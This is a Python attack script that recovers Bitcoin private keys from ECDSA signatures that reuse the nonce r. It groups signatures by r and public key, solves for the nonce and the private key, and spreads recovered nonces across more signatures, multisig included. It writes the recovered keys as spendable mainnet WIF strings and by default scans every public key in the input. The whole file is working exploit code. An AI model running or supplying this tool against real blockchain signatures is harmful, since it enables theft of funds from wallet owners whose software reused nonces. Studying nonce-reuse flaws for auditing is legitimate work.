#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
recover_stronger.py

Stronger ECDSA recovery from duplicate-R signatures with iterative propagation,
now with:
- WSH multisig pub-matching (records may carry pub_candidates list)
- Optional SQLite caching to dedupe / persist large datasets
- Extra validation: re-sign check (formula) and r-from-k check (k·G.x mod n)
- Seeding from previous recovered k/keys across runs

INPUT (signatures):
  JSONL (one object per line) OR JSON array.
  Required fields per signature:
    - txid (str), vin (int)
    - z (hex string)  <-- *must be correct sighash digest*
    - r/s (hex) OR signature_hex (DER+type to parse r/s)
    - Either:
        pubkey_hex / pub / pubkey  (single pub)
      OR
        pub_candidates (list[str])  (for multisig WSH; any of these may be signer)
    - (optional) type: "legacy"|"witness"|"witness-wsh"|"witness-wsh-multisig" (free-form)
    - (optional) sighash (int) — informational

USAGE:
  python3 recover_stronger.py --sigs signatures.jsonl -v
  python3 recover_stronger.py --sigs signatures.jsonl --rlist r_values.txt -v --resign-check --check-r-from-k
  python3 recover_stronger.py --sigs signatures.json --sqlite sigs.db --export-clusters dupR_clusters.jsonl --report-collisions r_collisions.jsonl -v
  # reuse seeds across runs:
  python3 recover_stronger.py --sigs signatures.jsonl --seed-k recovered_k.jsonl --seed-keys recovered_keys.jsonl

OUTPUTS:
  recovered_keys.jsonl / recovered_keys.txt
  recovered_k.jsonl  (r -> k candidates)
  (optional) dupR_clusters.jsonl
  (optional) r_collisions.jsonl
"""

import argparse, json, sys, os, sqlite3, hashlib, base58
from collections import defaultdict
from itertools import combinations
from typing import Dict, Any, List, Tuple, Set

from coincurve import PrivateKey  # pip install coincurve

# ===== secp256k1 =====
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
def inv(x: int) -> int: return pow(x, -1, N)

def to_wif(d: int, compressed: bool = True, mainnet: bool = True) -> str:
    prefix = b"\x80" if mainnet else b"\xEF"
    payload = prefix + d.to_bytes(32, "big") + (b"\x01" if compressed else b"")
    chk = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
    return base58.b58encode(payload + chk).decode()

def hexint(s: str) -> int:
    s = (s or "").strip().lower()
    if s.startswith('"') and s.endswith('"'):
        s = s[1:-1]
    if s.startswith("0x"):
        s = s[2:]
    return int(s, 16)

def normalize_pub(pub_hex: str) -> str:
    s = (pub_hex or "").strip().lower()
    if s.startswith('"') and s.endswith('"'):
        s = s[1:-1]
    return s

def parse_der_sig_plus_type(sig_hex: str) -> Tuple[int,int,int]:
    """
    Parse DER signature optionally suffixed with sighash byte.
    Returns (r, s, sighash) where sighash may be -1 if absent.
    """
    b = bytes.fromhex(sig_hex)
    sighash = -1
    candidates = [b, b[:-1]] if (len(b) >= 10 and b[0] == 0x30) else [b]
    for blob in candidates:
        try:
            if len(blob) < 9 or blob[0] != 0x30:
                continue
            i = 2
            if blob[i] != 0x02: continue
            lr = blob[i+1]; r = int.from_bytes(blob[i+2:i+2+lr], "big"); i += 2+lr
            if blob[i] != 0x02: continue
            ls = blob[i+1]; s = int.from_bytes(blob[i+2:i+2+ls], "big"); i += 2+ls
            if blob is b[:-1]:
                sighash = b[-1]
            return r % N, s % N, sighash
        except Exception:
            continue
    raise ValueError("Bad DER signature")

def ecdsa_ok(s: int, z: int, r: int, d: int, k: int) -> bool:
    # s ≡ k^{-1}(z + r·d) (mod N)
    if not (1 <= s < N and 1 <= r < N and 1 <= k < N and 1 <= d < N):
        return False
    try:
        return (inv(k) * ((z + (r * d) % N) % N)) % N == (s % N)
    except ValueError:
        return False

def r_from_k(k: int) -> int:
    """Compute r as x((k·G)) mod n using coincurve (compressed point: header + X)."""
    P = PrivateKey(k.to_bytes(32, "big")).public_key
    x = int.from_bytes(P.format(compressed=True)[1:], "big")
    return x % N

def derive_pub_hex(d: int) -> Tuple[str, str]:
    pk = PrivateKey(d.to_bytes(32, "big")).public_key
    return pk.format(compressed=True).hex().lower(), pk.format(compressed=False).hex().lower()

# ===== SQLite cache (optional) =====
class SigDB:
    def __init__(self, path: str):
        self.path = path
        self.conn = sqlite3.connect(path)
        self.conn.execute("""
          CREATE TABLE IF NOT EXISTS sigs (
            txid TEXT,
            vin  INTEGER,
            rhex TEXT,
            shex TEXT,
            zhex TEXT,
            pub  TEXT,          -- single pub if known (nullable)
            pubs_json TEXT,     -- JSON array of candidates if multisig
            PRIMARY KEY (txid, vin)
          );
        """)
        self.conn.execute("CREATE INDEX IF NOT EXISTS ix_sigs_r ON sigs(rhex);")
        self.conn.commit()

    def upsert(self, rec: Dict[str, Any]):
        txid = rec.get("txid",""); vin = int(rec.get("vin",0))
        rhex = f"{rec['r']:064x}"; shex = f"{rec['s']:064x}"; zhex = f"{rec['z']:064x}"
        pub = rec.get("pub") or None
        pubs_json = json.dumps(rec.get("pubs") or []) if ("pubs" in rec) else None
        self.conn.execute("""
          INSERT INTO sigs(txid,vin,rhex,shex,zhex,pub,pubs_json)
          VALUES(?,?,?,?,?,?,?)
          ON CONFLICT(txid,vin) DO UPDATE SET
            rhex=excluded.rhex, shex=excluded.shex, zhex=excluded.zhex,
            pub=COALESCE(excluded.pub, sigs.pub),
            pubs_json=COALESCE(excluded.pubs_json, sigs.pubs_json)
        """, (txid, vin, rhex, shex, zhex, pub, pubs_json))
        # no per-row commit (faster); caller commits at the end

    def commit(self): self.conn.commit()
    def close(self): self.conn.close()

# ===== Loaders =====
def load_rlist(path: str) -> Set[int]:
    rset: Set[int] = set()
    if not path or not os.path.exists(path): return rset
    with open(path, "r", encoding="utf-8") as f:
        for line in f:
            s = line.strip()
            if not s: continue
            try: rset.add(hexint(s))
            except Exception: pass
    return rset

def load_seed_k(path: str) -> Dict[int, Set[int]]:
    out: Dict[int, Set[int]] = defaultdict(set)
    if not path or not os.path.exists(path): return out
    with open(path, "r", encoding="utf-8") as f:
        for line in f:
            line=line.strip()
            if not line: continue
            try:
                j=json.loads(line)
                r = hexint(j["r"])
                ks = [hexint(k) for k in j.get("k_candidates",[])]
                out[r].update(k for k in ks if 0<k<N)
            except Exception:
                pass
    return out

def load_seed_keys(path: str) -> Dict[str, int]:
    out: Dict[str,int] = {}
    if not path or not os.path.exists(path): return out
    with open(path, "r", encoding="utf-8") as f:
        for line in f:
            line=line.strip()
            if not line: continue
            try:
                j=json.loads(line)
                pub = normalize_pub(j.get("pubkey") or j.get("pub") or j.get("pubkey_hex") or "")
                d = hexint(j.get("priv_hex") or "")
                if pub and 0<d<N: out[pub]=d
            except Exception:
                pass
    return out

def load_signatures_any(path: str, target_pub: str = "", rfilter: Set[int] = None, verbose: bool=False,
                        sqlite_db: SigDB = None) -> List[Dict[str, Any]]:
    """
    Accepts JSONL (one object per line) OR a JSON array file.
    Supports:
      - single pub: pubkey_hex/pub/pubkey
      - multisig candidates: pub_candidates (list[str])
    r/s from fields OR parsed from signature_hex. z REQUIRED.
    """
    rows: List[Dict[str, Any]] = []
    tpub = normalize_pub(target_pub) if target_pub else ""
    rfilter = rfilter or set()

    if not os.path.exists(path):
        print(f"[error] signatures file not found: {path}")
        return rows

    def push_obj(j: Dict[str, Any]):
        # z
        if "z" not in j: return
        try: z = hexint(j["z"])
        except Exception: return

        # r,s
        r_val = s_val = None
        if "r" in j and "s" in j:
            try:
                r_val = hexint(j["r"]); s_val = hexint(j["s"])
            except Exception:
                r_val = s_val = None
        if (r_val is None or s_val is None) and j.get("signature_hex"):
            try:
                rr, ss, _ = parse_der_sig_plus_type(j["signature_hex"])
                r_val, s_val = rr, ss
            except Exception:
                return
        if r_val is None or s_val is None: return
        if not (1 <= r_val < N and 1 <= s_val < N): return
        if rfilter and (r_val not in rfilter): return

        # pubs
        pubs: List[str] = []
        single = normalize_pub(j.get("pubkey_hex") or j.get("pub") or j.get("pubkey"))
        if single:
            pubs = [single]
        elif "pub_candidates" in j and isinstance(j["pub_candidates"], list):
            pubs = [normalize_pub(p) for p in j["pub_candidates"] if isinstance(p, str)]
            pubs = [p for p in pubs if p]
            if not pubs:
                return
        else:
            # no pub info at all? skip
            return

        # txid/vin
        txid = j.get("txid","")
        try: vin = int(j.get("vin",0))
        except Exception: vin = 0

        rec = {"txid": txid, "vin": vin, "r": r_val, "s": s_val, "z": z, "pubs": pubs}
        # optional convenience: if only one pub, also expose "pub"
        if len(pubs) == 1:
            rec["pub"] = pubs[0]

        rows.append(rec)

        # optional SQLite cache
        if sqlite_db:
            try:
                sqlite_db.upsert(rec)
            except Exception:
                pass

    with open(path, "r", encoding="utf-8") as f:
        data = f.read().strip()
        if data.startswith('"') and data.endswith('"') and "\n" not in data:
            data = data[1:-1]
        first = next((c for c in data if not c.isspace()), "")
        if first == "[":
            try:
                arr = json.loads(data)
                if isinstance(arr, list):
                    for j in arr:
                        if isinstance(j, dict): push_obj(j)
            except Exception as e:
                print(f"[error] failed to parse JSON array: {e}")
        else:
            for line in data.splitlines():
                line=line.strip()
                if not line: continue
                if line.startswith('"') and line.endswith('"'): line=line[1:-1]
                try:
                    j=json.loads(line)
                except Exception:
                    continue
                if isinstance(j, dict): push_obj(j)

    if sqlite_db:
        sqlite_db.commit()

    if verbose:
        print(f"[info] loaded {len(rows)} usable signatures"
              + (f" (filtered by {len(rfilter)} r-values)" if rfilter else ""))
    return rows

# ===== Indexing helpers (multisig-aware) =====
def index_by_r(rows: List[Dict[str, Any]]) -> Dict[int, List[Dict[str, Any]]]:
    m = defaultdict(list)
    for rec in rows: m[rec["r"]].append(rec)
    return m

def index_by_r_pub_candidates(rows: List[Dict[str, Any]]) -> Dict[int, Dict[str, List[Dict[str, Any]]]]:
    """
    r -> pub -> list of recs where pub is among rec['pubs'].
    (expands multisig candidates; safe — final math verification will filter.)
    """
    out = defaultdict(lambda: defaultdict(list))
    for rec in rows:
        r = rec["r"]
        for p in rec["pubs"]:
            out[r][p].append(rec)
    return out

def index_recs_by_pub(rows: List[Dict[str, Any]]) -> Dict[str, List[Dict[str, Any]]]:
    out = defaultdict(list)
    for rec in rows:
        for p in rec["pubs"]:
            out[p].append(rec)
    return out

# ===== Recovery core =====
def recover_from_pair(r: int, a: Dict[str, Any], b: Dict[str, Any]):
    s1, s2, z1, z2 = a["s"], b["s"], a["z"], b["z"]
    cands = []
    # Path 1: s1 - s2
    denom = (s1 - s2) % N
    if denom != 0:
        k = ((z1 - z2) * inv(denom)) % N
        d = ((s1 * k - z1) * inv(r)) % N
        if 1 <= d < N and k != 0:
            cands.append((d, k, "diff"))
    # Path 2: s1 + s2 (handles s ↔ N-s malleation)
    denom2 = (s1 + s2) % N
    if denom2 != 0:
        k2 = ((z1 + z2) * inv(denom2)) % N
        d2 = ((s1 * k2 - z1) * inv(r)) % N
        if 1 <= d2 < N and k2 != 0:
            cands.append((d2, k2, "sum"))
    return cands

def add_k_candidate(r: int, k: int, store: Dict[int, Set[int]]):
    if k and 0 < k < N:
        store.setdefault(r, set()).add(k)
        store[r].add((N - k) % N)  # include complement for sign flip

def main():
    ap = argparse.ArgumentParser(description="Stronger ECDSA recovery w/ multisig matching, SQLite cache, extra checks")
    ap.add_argument("--sigs", default="signatures.jsonl", help="signatures.jsonl or .json")
    ap.add_argument("--rlist", default="", help="optional r_values.txt (filter)")
    ap.add_argument("--sqlite", default="", help="optional SQLite db path for caching (e.g., sigs.db)")
    ap.add_argument("--seed-k", default="", help="seed recovered_k.jsonl to bootstrap propagation")
    ap.add_argument("--seed-keys", default="", help="seed recovered_keys.jsonl to carry over known privs")
    ap.add_argument("--out-json", default="recovered_keys.jsonl", help="output JSONL with recoveries")
    ap.add_argument("--out-txt",  default="recovered_keys.txt", help="output TXT with recoveries")
    ap.add_argument("--out-k",    default="recovered_k.jsonl", help="output JSONL with recovered k per r")
    ap.add_argument("--pub", default="", help="optional pubkey filter (33/65-byte hex) — omit to scan ALL")
    ap.add_argument("--min-count", type=int, default=2, help="minimum signatures per (pub,r) cluster (for primary)")
    ap.add_argument("--max-iter", type=int, default=4, help="max propagation iterations")
    ap.add_argument("--testnet", action="store_true", help="emit testnet WIF (else mainnet)")
    ap.add_argument("--report-collisions", default="", help="write cross-pub r-collisions JSONL (info)")
    ap.add_argument("--export-clusters",  default="", help="write dupR_clusters.jsonl for (pub,r) clusters (>=2)")
    ap.add_argument("--resign-check", action="store_true", help="extra check: recompute s and compare")
    ap.add_argument("--check-r-from-k", action="store_true", help="extra check: r == x(k·G) mod n")
    ap.add_argument("-v", "--verbose", action="store_true", help="verbose logging")
    args = ap.parse_args()

    rset = load_rlist(args.rlist)
    sqlite_db = SigDB(args.sqlite) if args.sqlite else None

    rows = load_signatures_any(args.sigs, target_pub=args.pub, rfilter=rset, verbose=args.verbose, sqlite_db=sqlite_db)
    if sqlite_db: sqlite_db.close()
    if not rows:
        print("No usable signatures found. Need z and either (r,s) or signature_hex + pub(pub_candidates).")
        sys.exit(1)

    # Seeds
    recovered_k_by_r: Dict[int, Set[int]] = load_seed_k(args.seed_k)
    recovered_priv_by_pub: Dict[str, int]  = load_seed_keys(args.seed_keys)

    # Indexes
    rmap            = index_by_r(rows)
    r_pub_index     = index_by_r_pub_candidates(rows)  # r -> pub -> [recs]
    recs_by_pub     = index_recs_by_pub(rows)

    # Optional reports
    if args.report_collisions:
        out = 0
        with open(args.report_collisions, "w", encoding="utf-8") as f:
            for r_val, pubmap in r_pub_index.items():
                if len(pubmap) <= 1: continue
                obj = {
                    "r": f"{r_val:064x}",
                    "pubs": {pub: [{"txid": x["txid"], "vin": x["vin"]} for x in lst] for pub, lst in pubmap.items()},
                    "distinct_pubs": len(pubmap),
                    "total_sightings": sum(len(lst) for lst in pubmap.values())
                }
                f.write(json.dumps(obj) + "\n"); out += 1
        if args.verbose: print(f"[info] wrote {out} cross-pub r-collision records -> {args.report_collisions}")

    if args.export_clusters:
        cnt = 0
        with open(args.export_clusters, "w", encoding="utf-8") as f:
            for r_val, pubmap in r_pub_index.items():
                for pub, lst in pubmap.items():
                    if len(lst) < args.min_count: continue
                    obj = {
                        "r": f"{r_val:064x}",
                        "pubkey": pub,
                        "count": len(lst),
                        "sightings": [{"txid": x["txid"], "vin": x["vin"]} for x in lst]
                    }
                    f.write(json.dumps(obj) + "\n"); cnt += 1
        if args.verbose: print(f"[info] wrote {cnt} clusters -> {args.export_clusters}")

    recovered: List[Dict[str, Any]] = []
    seen_privs: Set[int] = set(recovered_priv_by_pub.values()) if recovered_priv_by_pub else set()

    # Phase A: primary recovery per (r, pub) where count >= min_count
    for r_val, pubmap in r_pub_index.items():
        for pub, lst in pubmap.items():
            if len(lst) < args.min_count:
                if args.verbose:
                    print(f"[-] singleton skipped (pub={pub[:16]}…, r={r_val:064x}, count={len(lst)})")
                continue

            if args.verbose:
                print(f"[cluster pub={pub[:16]}… r={r_val:064x}] count={len(lst)}")

            for a, b in combinations(lst, 2):
                for d, k, why in recover_from_pair(r_val, a, b):
                    # extra checks
                    if args.check_r_from_k and r_from_k(k) != (r_val % N):
                        continue
                    if args.resign_check and not (ecdsa_ok(a["s"], a["z"], r_val, d, k) and ecdsa_ok(b["s"], b["z"], r_val, d, k)):
                        continue

                    # pub verify
                    try:
                        pk_c, pk_u = derive_pub_hex(d)
                    except Exception:
                        continue
                    if pub not in (pk_c, pk_u):
                        continue

                    # accept
                    if d not in seen_privs:
                        seen_privs.add(d)
                        recovered_priv_by_pub[pub] = d
                        wif = to_wif(d, compressed=True, mainnet=not args.testnet)
                        rec = {
                            "pubkey": pub, "priv_hex": f"{d:064x}", "wif": wif,
                            "r": f"{r_val:064x}",
                            "proof": [
                                {"txid": a["txid"], "vin": a["vin"]},
                                {"txid": b["txid"], "vin": b["vin"]}
                            ],
                            "method": f"primary-{why}"
                        }
                        recovered.append(rec)
                        print("="*62)
                        print(f"[RECOVERED] pub={pub}")
                        print(f"  d (hex): {d:064x}")
                        print(f"  WIF   : {wif}")
                        print(f"  via   : {a['txid']}:{a['vin']}  &  {b['txid']}:{b['vin']}  ({why})")
                        print("="*62)

                    # seed k candidates for this r
                    add_k_candidate(r_val, k, recovered_k_by_r)
                    # plus reinforce via d over both sigs
                    try:
                        k_a = ((a["z"] + (r_val * d) % N) % N) * inv(a["s"]) % N
                        add_k_candidate(r_val, k_a, recovered_k_by_r)
                        k_b = ((b["z"] + (r_val * d) % N) % N) * inv(b["s"]) % N
                        add_k_candidate(r_val, k_b, recovered_k_by_r)
                    except Exception:
                        pass

    # Helpers for propagation
    def expand_k_from_privs() -> int:
        added = 0
        for pub, d in list(recovered_priv_by_pub.items()):
            for sig in recs_by_pub.get(pub, []):
                r_val = sig["r"]
                try:
                    k = ((sig["z"] + (r_val * d) % N) % N) * inv(sig["s"]) % N
                except Exception:
                    continue
                before = len(recovered_k_by_r[r_val])
                add_k_candidate(r_val, k, recovered_k_by_r)
                after = len(recovered_k_by_r[r_val])
                added += (after - before)
        return added

    def propagate_with_known_k() -> int:
        new_count = 0
        for r_val, kset in list(recovered_k_by_r.items()):
            if not kset: continue
            if args.verbose:
                print(f"[propagate r={r_val:064x}] trying {len(kset)} k-candidate(s) over {len(rmap.get(r_val, []))} signature(s)")
            for sig in rmap.get(r_val, []):
                # skip if already recovered *this* pub
                # (for multisig we accept if derived pub ∈ sig['pubs'])
                for k in list(kset):
                    # checks
                    if args.check_r_from_k and r_from_k(k) != (r_val % N):
                        continue
                    try:
                        d = ((sig["s"] * k - sig["z"]) * inv(r_val)) % N
                        if not (1 <= d < N): continue
                        if args.resign_check and not ecdsa_ok(sig["s"], sig["z"], r_val, d, k):
                            continue
                        pk_c, pk_u = derive_pub_hex(d)
                        matched_pub = pk_c if pk_c in sig["pubs"] else (pk_u if pk_u in sig["pubs"] else None)
                        if not matched_pub:
                            continue
                        if matched_pub in recovered_priv_by_pub and recovered_priv_by_pub[matched_pub] == d:
                            continue
                    except Exception:
                        continue

                    # accept
                    if d in seen_privs and all(recovered_priv_by_pub.get(p) != d for p in sig["pubs"]):
                        # same d tied to other pub? unlikely, but keep unique per pub
                        pass
                    seen_privs.add(d)
                    recovered_priv_by_pub[matched_pub] = d
                    wif = to_wif(d, compressed=True, mainnet=not args.testnet)
                    rec = {
                        "pubkey": matched_pub,
                        "priv_hex": f"{d:064x}",
                        "wif": wif,
                        "r": f"{r_val:064x}",
                        "proof": [{"txid": sig["txid"], "vin": sig["vin"]}],
                        "method": "propagate-from-r"
                    }
                    recovered.append(rec)
                    print("="*62)
                    print(f"[RECOVERED via propagation] pub={matched_pub}")
                    print(f"  d (hex): {d:064x}")
                    print(f"  WIF   : {wif}")
                    print(f"  via   : {sig['txid']}:{sig['vin']}  (r={r_val:064x})")
                    print("="*62)
                    new_count += 1
        return new_count

    # Phase B: iterate until fixed point
    iter_no = 0
    while iter_no < args.max_iter:
        iter_no += 1
        grew_k = expand_k_from_privs()
        grew_keys = propagate_with_known_k()
        if args.verbose:
            print(f"[iter {iter_no}] grew_k={grew_k}, grew_keys={grew_keys}")
        if grew_k == 0 and grew_keys == 0:
            break

    # Outputs
    if not recovered:
        print("Tried primary clusters and iterative propagation; no valid recovery.")
        print("Note: need at least one (r,pub) cluster OR a seed k/key to bootstrap.")
        sys.exit(0)

    with open(args.out_json, "w", encoding="utf-8") as f:
        for rec in recovered:
            f.write(json.dumps(rec) + "\n")
    with open(args.out_txt, "w", encoding="utf-8") as f:
        for rec in recovered:
            if rec["method"].startswith("primary"):
                via = f"{rec['proof'][0]['txid']}:{rec['proof'][0]['vin']} & {rec['proof'][1]['txid']}:{rec['proof'][1]['vin']}"
            else:
                via = f"{rec['proof'][0]['txid']}:{rec['proof'][0]['vin']}"
            f.write(f"PUB={rec['pubkey']} PRIV={rec['priv_hex']} WIF={rec['wif']} "
                    f"R={rec['r']} via {via} ({rec['method']})\n")

    with open(args.out_k, "w", encoding="utf-8") as f:
        for r_val, kset in recovered_k_by_r.items():
            if not kset: continue
            f.write(json.dumps({
                "r": f"{r_val:064x}",
                "k_candidates": [f"{k:064x}" for k in sorted(kset)]
            }) + "\n")

    print(f"\nSaved {len(recovered)} recovery record(s) to:")
    print(f"  {args.out_json}")
    print(f"  {args.out_txt}")
    print(f"Saved recovered k candidates per r to: {args.out_k}")

if __name__ == "__main__":
    main()


"""
python3 recover_stronger.py --sigs signatures.jsonl \
  --report-collisions r_collisions.jsonl \
  --export-clusters dupR_clusters.jsonl \
  --sqlite sigs.db \
  --resign-check --check-r-from-k -v


სიდებით აღდგენა:
python3 recover_stronger.py --sigs more_sigs.jsonl \
  --seed-k recovered_k.jsonl --seed-keys recovered_keys.jsonl \
  --sqlite sigs.db -v
"""
